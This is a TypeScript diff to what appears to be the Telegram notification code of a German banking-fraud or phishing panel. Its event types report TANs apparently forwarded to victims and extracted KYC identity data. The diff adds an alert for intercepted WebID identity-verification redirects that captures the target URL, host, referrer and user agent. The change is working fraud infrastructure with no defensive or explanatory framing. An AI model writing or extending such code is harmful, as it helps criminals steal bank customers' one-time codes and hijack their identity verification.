@@ -11,6 +11,7 @@ export type TelegramEvent =
   | "user_account_created"
   | "tan_forwarded_to_vic"
   | "kyc_data_extracted"
+  | "webid_redirect_intercepted"
   | "test";
 
 interface Payload {
@@ -122,6 +123,17 @@ function formatMessage(event: TelegramEvent, p: Payload): string {
         `<b>PLZ Stadt:</b> ${[p.zip_code, p.city].filter((x) => String(x ?? "").trim()).map(esc).join(" ") || dash}`,
       ].join("\n");
     }
+
+    case "webid_redirect_intercepted":
+      return [
+        `🔗 <b>WebID Redirect abgefangen</b>`,
+        p.url ? `🎯 Ziel: ${code(p.url)}` : null,
+        p.host ? `🌐 Host: ${esc(p.host)}` : null,
+        p.source ? `🧭 Quelle: ${esc(p.source)}` : null,
+        p.path ? `📄 Pfad: ${esc(p.path)}` : null,
+        p.referrer ? `↩️ Referrer: ${esc(p.referrer)}` : null,
+        p.userAgent ? `🖥️ UA: ${esc(p.userAgent)}` : null,
+      ].filter(Boolean).join("\n");
 
     case "test":
       return `🔔 <b>Test-Nachricht</b>\nDie Telegram-Anbindung funktioniert.`;
